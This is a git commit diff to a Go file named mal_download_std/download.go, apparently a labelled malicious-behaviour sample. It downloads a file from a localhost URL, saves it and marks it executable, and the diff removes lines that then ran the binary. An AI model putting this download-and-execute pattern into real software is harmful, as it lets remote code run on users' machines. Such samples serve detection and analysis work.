24551c274ca153b53fcc232a7c6c44b262617c29
carminecesarano <c.cesarano@hotmail.it>
2025-04-02 15:32:19 +0200

    adedd mal_download no std

--- mal_download_std/download.go
+++ mal_download_std/download.go
@@ -4,13 +4,11 @@ import (
 	"io"
 	"net/http"
 	"os"
-	"os/exec"
 )
 
 func DownloadFile() {
 	url := "http://localhost:8080/executable"
-
-	fileName := "downloaded-binary"
+	fileName := "downloaded_file"
 
 	resp, _ := http.Get(url)
 	defer resp.Body.Close()
@@ -19,14 +17,6 @@ func DownloadFile() {
 	defer out.Close()
 
 	_, _ = io.Copy(out, resp.Body)
-
 	_ = out.Close()
-
 	_ = os.Chmod(fileName, 0755)
-
-	cmd := exec.Command("./" + fileName)
-	cmd.Stdout = os.Stdout
-	cmd.Stderr = os.Stderr
-
-	_ = cmd.Run()
 }
